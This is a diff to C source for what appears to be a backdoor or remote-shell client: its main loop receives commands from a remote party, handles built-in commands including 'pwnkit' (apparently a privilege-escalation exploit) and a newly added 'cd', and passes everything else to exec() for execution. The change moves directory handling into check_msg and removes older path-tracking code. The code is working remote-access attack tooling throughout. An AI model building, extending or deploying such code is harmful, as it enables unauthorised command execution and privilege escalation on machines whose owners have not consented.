@@ -998,6 +998,9 @@ int nyan() {
 int check_msg(char *msg) {
     size_t s = strlen(msg);
     if (s && (msg[s-1] == '\n')) msg[--s] = 0;
+    #if DEBUG==1
+    printf("checking msg: %s\n", msg);
+    #endif
     if(strcmp(msg, "pwnkit")==0) {
         if(pwnkit()<0) {
             #if DEBUG==1
@@ -1126,6 +1129,17 @@ int check_msg(char *msg) {
         _cleanup();
         return(2);
     }
+    else if (strlen(msg)>3 && msg[0]=='c' && msg[1]=='d' && msg[2]==' '){
+        char *path=msg+3;
+        #if DEBUG==1
+        printf("chdir to %s!\n", path);
+        #endif
+        int cres=chdir(path);
+        if(cres==-1) {
+           perror("chdir failed");
+        }
+        return(1);
+    }
     else {
         return(0);
     }
@@ -1220,46 +1234,8 @@ int main(int argc, char **argv)
     #if DEBUG==1
     printf("\nmagic: %s\n", magic);
     #endif
-    char PWD[5000]="";
-    char OLDPWD[5000]="";
-    memmove(PWD, HOME, strlen(HOME));
-    #if DEBUG==1
-    puts(PWD); //debug
-    puts(OLDPWD);//debug
-    #endif
-    int no=0;
+
     while(1) {
-        no=0;
-        int r_p=1;
-        if(strcmp(PWD, OLDPWD)!=0) {
-            #if DEBUG==1
-            printf("chdir because: %s!=%s\n", PWD, OLDPWD); //debug
-            #endif
-            r_p=chdir(PWD);
-        }
-        if(r_p!=0) {
-            #if DEBUG==1
-            printf("pwd: %s\nold pwd: %s\n", PWD, OLDPWD);
-            #endif
-            if(strcmp(PWD,OLDPWD)!=0) {
-                #if DEBUG==1
-                printf("chdir to %s failed!\n", PWD);
-                #endif
-                char msg_[5021]="";
-                sprintf(msg_, "cannot cd to %s\n%s\n", PWD, strerror(errno));
-                #if DEBUG==1
-                puts(msg_);
-                #endif
-                _send(msg_);
-                chdir(HOME);
-                memmove(PWD, HOME, strlen(HOME));
-                memmove(OLDPWD, HOME, strlen(HOME));
-            }
-        }
-        else {
-            PWD[4999]='\0';
-            memmove(OLDPWD, PWD, strlen(PWD));
-        }
         response r_msg;
         r_msg=_recv();
         char *msg=r_msg.data;
@@ -1273,54 +1249,12 @@ int main(int argc, char **argv)
         #if DEBUG==1
         printf("msg in main: %s\n", msg);
         #endif
-        char bak[r_msg.buf_sz+1];
-        memmove(bak, msg, r_msg.buf_sz+1);
-        #if DEBUG==1
-        printf("bak: %s\n", bak);
-        #endif
-        if(strlen(bak)>3 && bak[0]=='c' && bak[1]=='d') {
-            char *tok=strtok(bak, " ");
-            #if DEBUG==1
-            printf("tok: %s\n", tok);
-            #endif
-            memmove(OLDPWD, PWD, strlen(PWD));
-            OLDPWD[4999]='\0';
-            PWD[0]='\0';
-            int pl=0;
-            if(tok!=NULL) {
-                while(tok!=NULL) {
-                    tok=strtok(NULL, " ");
-                    if(tok!=NULL) {
-                        if(pl>0) {
-                            memmove(PWD+strlen(PWD), " ", 2);
-                        }
-                        pl+=strlen(tok);
-                        if(pl<4000) {
-                            memmove(PWD+strlen(PWD), tok, strlen(tok)+1);
-                            #if DEBUG==1
-                            printf("MAX PATH EXCEEDED: cutting for chdir!\n");
-                            #endif
-                        }
-                    }
-                }
-                if(strcmp(PWD, "")==0) {
-                    _send("cannot cd to empty path!\n");
-                }
-                else {
-                    char *m=malloc(4096);
-                    memset(m, 0, 4096);
-                    sprintf(m, "new cwd: %s\n", PWD);
-                    _send(m);
-                    free(m);
-                }
-                no=1;
-            }
-        }
+
         int cres=check_msg(msg);
         #if DEBUG==1
-        printf("cres: %i\nno: %i\n", cres, no);
+        printf("cres: %i\n", cres);
         #endif
-        if(cres==0 && no==0) {
+        if(cres==0) {
             char* output=exec(msg);
             if(output==NULL) {
                 #if DEBUG==1
